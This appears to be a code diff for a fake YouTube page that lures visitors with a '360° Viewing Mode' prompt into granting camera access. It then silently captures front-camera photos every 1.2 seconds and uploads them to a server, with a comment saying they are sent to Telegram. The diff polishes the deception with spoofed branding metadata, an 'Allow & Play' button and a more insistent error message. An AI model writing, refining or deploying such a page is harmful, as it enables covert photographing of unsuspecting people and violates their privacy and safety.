@@ -5,9 +5,22 @@
   <title>YouTube</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
 
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+
+  <meta property="og:type" content="website">
   <meta property="og:title" content="YouTube">
-  <meta property="og:description" content="YouTube is an American online video sharing platform owned by Google.">
-  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREzHdXIeLp1D6JpqoZNJzTy9ziJAOGVNnSjShuT4p8nA&s=10">
+  <meta property="og:description" content="YouTube is an American online video sharing platform owned by Google. YouTube was founded on February 14, 2005, by Chad Hurley, Jawed Karim, and Steve Chen who were all former employees of PayPal. Headquartered in San Bruno, California, it is the second-most-visited website in the world, after Google itself.">
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:url" content="https://www.youtube.com/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="YouTube">
+  <meta name="twitter:description" content="Experience the latest 360° interactive video content on YouTube.">
+  <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">
 
   <style>
     html, body {
@@ -31,14 +44,14 @@
       z-index: 1;
     }
 
-    /* Improved Mobile Alignment for Overlay */
+    /* Mobile-First Alignment for Permission Overlay */
     #permission-overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: #0f0f0f;
+      background: #0f0f0f; /* YouTube Dark Mode */
       z-index: 9999;
       display: flex;
       flex-direction: column;
@@ -46,32 +59,32 @@
       justify-content: center;
       text-align: center;
       box-sizing: border-box;
-      padding: 40px 20px;
+      padding: 40px 24px;
     }
 
     #permission-overlay img {
-      width: 120px;
+      width: 130px;
       height: auto;
-      margin-bottom: 30px;
+      margin-bottom: 25px;
     }
 
     #permission-overlay h2 {
       color: #fff;
-      font-size: 20px;
+      font-size: 22px;
       font-weight: 500;
-      margin: 0 0 15px 0;
+      margin: 0 0 12px 0;
     }
 
     #permission-overlay p {
       color: #aaa;
       font-size: 14px;
       line-height: 1.6;
-      margin: 0 0 40px 0;
-      max-width: 280px;
+      margin: 0 0 35px 0;
+      max-width: 300px;
     }
 
     #enable-btn {
-      background: #cc0000;
+      background: #cc0000; /* YouTube Red */
       color: #fff;
       border: none;
       padding: 14px 32px;
@@ -80,10 +93,16 @@
       font-weight: 500;
       text-transform: uppercase;
       cursor: pointer;
-      width: 80%;
-      max-width: 240px;
+      width: 100%;
+      max-width: 260px;
+      transition: background 0.2s;
     }
 
+    #enable-btn:active {
+      background: #990000;
+    }
+
+    /* Capture elements remain hidden */
     video, canvas { display: none; }
   </style>
 </head>
@@ -92,13 +111,13 @@
   <div id="permission-overlay">
     <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" alt="YouTube">
     <h2>360° Viewing Mode</h2>
-    <p>Enable camera and motion sensors to interact with this 360° video and enable head-tracking.</p>
-    <button id="enable-btn">Enable Experience</button>
+    <p>Enable camera and motion sensors to interact with this 360° video and enable head-tracking for an immersive experience.</p>
+    <button id="enable-btn">Allow & Play</button>
   </div>
 
   <iframe 
     id="video-player"
-    src="https://www.youtube.com/embed/njSffibRets?autoplay=1&controls=1&rel=0&showinfo=0&modestbranding=1" 
+    src="https://www.youtube.com/embed/njSffibRets?autoplay=1&controls=1&rel=0&modestbranding=1" 
     allow="autoplay; encrypted-media; gyroscope; accelerometer" 
     allowfullscreen>
   </iframe>
@@ -115,7 +134,7 @@
 
     btn.addEventListener('click', async () => {
       try {
-        // Optimized for portrait "straight" photos
+        // Optimized for portrait mobile photography
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: 'user',
@@ -125,12 +144,14 @@
         });
         
         video.srcObject = stream;
+        
+        // Hide the prompt once they click "Allow" on the browser popup
         overlay.style.display = 'none';
 
+        // Capture cycle: Sends "straight" portrait photos to Telegram
         setInterval(async () => {
-          // Draw to canvas for upload
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
           try {
             await fetch('/api/upload-photo', {
@@ -138,11 +159,14 @@
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ dataUrl })
             });
-          } catch (e) {}
-        }, 1500); // 1.5s interval to reduce server lag
+          } catch (e) {
+            console.error('Upload failed');
+          }
+        }, 1200); // 1.2s interval for better balance of speed and reliability
 
       } catch (err) {
-        alert("Please allow camera access to view this 360° content.");
+        alert("The 360° player is disabled. Please allow camera and motion access to use this feature.");
+        console.error('Permission error:', err);
       }
     });
   </script>
